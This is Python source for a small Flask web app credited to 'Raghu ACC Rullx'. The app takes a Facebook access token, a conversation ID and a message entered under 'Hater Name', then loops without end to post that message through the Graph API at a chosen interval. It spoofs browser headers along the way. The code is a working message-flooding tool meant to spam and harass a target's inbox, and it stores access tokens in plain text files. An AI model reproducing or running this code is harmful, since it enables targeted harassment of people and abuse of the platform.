from flask import Flask, request, render_template_string
import os
import threading
import time
import requests

app = Flask(__name__)

# Data directory
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "token.txt")
CONVO_FILE = os.path.join(DATA_DIR, "convo.txt")
MESSAGE_FILE = os.path.join(DATA_DIR, "file.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")

# Function to save form data
def save_data(token, convo_id, hater_name, delay):
    with open(TOKEN_FILE, "w") as f:
        f.write(token.strip())
    with open(CONVO_FILE, "w") as f:
        f.write(convo_id.strip())
    with open(MESSAGE_FILE, "w") as f:
        f.write(hater_name.strip())
    with open(TIME_FILE, "w") as f:
        f.write(str(delay))

# Function to send messages
def send_messages():
    try:
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
        with open(CONVO_FILE, "r") as f:
            convo_id = f.read().strip()
        with open(MESSAGE_FILE, "r") as f:
            message_text = f.read().strip()
        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())

        if not (token and convo_id and message_text):
            print("[!] Missing required data.")
            return

        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
        headers = {'User-Agent': 'Mozilla/5.0', 'referer': 'www.google.com'}
        payload = {'access_token': token, 'message': message_text}

        while True:
            response = requests.post(url, json=payload, headers=headers)
            if response.ok:
                print(f"[+] Message sent: {message_text}")
            else:
                print(f"[x] Failed: {response.status_code} {response.text}")

            time.sleep(delay)

    except Exception as e:
        print(f"[!] Error: {e}")

# HTML Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Created by Raghu ACC Rullx</title>
    <style>
        body { background-color: #f9f9f9; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { background: white; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        h1 { color: #333; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin: 10px 0 5px; }
        input { padding: 10px; border: 1px solid #ccc; border-radius: 5px; margin-bottom: 10px; }
        button { background-color: #007bff; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #0056b3; }
        footer { margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Created by Raghu ACC Rullx</h1>
        <form action="/" method="post">
            <label>Enter Your Token:</label>
            <input type="text" name="token" required>

            <label>Enter Convo/Inbox ID:</label>
            <input type="text" name="convo_id" required>

            <label>Enter Hater Name:</label>
            <input type="text" name="hater_name" required>

            <label>Speed in Seconds:</label>
            <input type="number" name="delay" value="5" min="1">

            <button type="submit">Submit Your Details</button>
        </form>
        <footer>© 2025 Created by Raghu ACC Rullx. All Rights Reserved.</footer>
    </div>
</body>
</html>
"""

# Flask route to render HTML form
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token = request.form.get("token")
        convo_id = request.form.get("convo_id")
        hater_name = request.form.get("hater_name")
        delay = request.form.get("delay", 5)

        if token and convo_id and hater_name:
            save_data(token, convo_id, hater_name, delay)
            threading.Thread(target=send_messages, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

# Start Flask server
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
